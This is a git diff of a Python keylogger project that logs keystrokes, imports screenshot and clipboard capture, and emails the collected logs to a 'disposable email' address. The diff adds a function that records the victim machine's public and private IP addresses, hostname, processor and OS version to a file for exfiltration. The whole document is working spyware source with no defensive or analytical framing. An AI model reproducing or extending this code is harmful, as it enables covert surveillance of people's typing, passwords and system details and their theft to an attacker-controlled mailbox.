@@ -26,9 +26,10 @@ from PIL import ImageGrab
 import pyperclip
 
 keys_information = "key_log.txt"
-email_address = "#######"
-password = "######"  # use google app password
-toaddr = "######"  # disposable email of your choice
+system_information = "systeminfo.txt"
+email_address = "##redacted##"
+password = "##redacted##"  # use google app password
+toaddr = "##redacted##"  # disposable email of your choice
 
 file_path = "//Users//joshuamcleod//Advanced-Python-Keylogger//Keylogger"
 extend = "//"
@@ -76,6 +77,29 @@ def send_email(filename, attachment, toaddr):
 
 
 send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip + '\n')
+        except Exception:
+            f.write(
+                "Couldn't Retreive Public IP Address (most likly max query)" + '\n')
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() +
+                " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + '\n')
+        f.write("Hostname: " + hostname + '\n')
+        f.write("Private IP Address: " + IPAddr + '\n')
+
+
+computer_information()
+
 
 count = 0
 keys = []
